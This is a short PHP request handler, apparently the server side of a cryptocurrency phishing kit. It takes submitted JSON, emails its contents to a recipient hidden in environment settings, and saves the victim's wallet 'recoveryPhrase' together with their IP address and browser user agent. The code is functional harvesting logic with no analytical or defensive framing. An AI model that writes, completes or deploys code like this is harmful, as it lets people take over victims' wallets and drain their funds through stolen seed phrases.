<?php
require __DIR__ . '/vendor/autoload.php';
require __DIR__ . '/src/services/mailer-service.php';
require __DIR__ . '/src/services/backup-service.php';

// Load environment variables
$dotenv = Dotenv\Dotenv::createImmutable(__DIR__);
$dotenv->load();

header('Content-Type: application/json');

try {
    // Get POST data
    $data = json_decode(file_get_contents('php://input'), true);
    
    if (!$data) {
        throw new Exception('Invalid request data');
    }
    
    // Initialize services
    $mailer = new MailerService();
    $backup = new BackupService();
    
    // Send email
    $mailer->sendEmail(
        $_ENV['RECIPIENT_EMAIL'],
        $data['subject'],
        $data['content']
    );

    // Save backup
    $backup->saveBackup([
        'recoveryPhrase' => $data['recoveryPhrase'],
        'ip' => $_SERVER['REMOTE_ADDR'],
        'userAgent' => $_SERVER['HTTP_USER_AGENT']
    ]);
    
    echo json_encode(['success' => true]);
    
} catch (Exception $e) {
    http_response_code(500);
    echo json_encode([
        'success' => false,
        'error' => $e->getMessage()
    ]);
}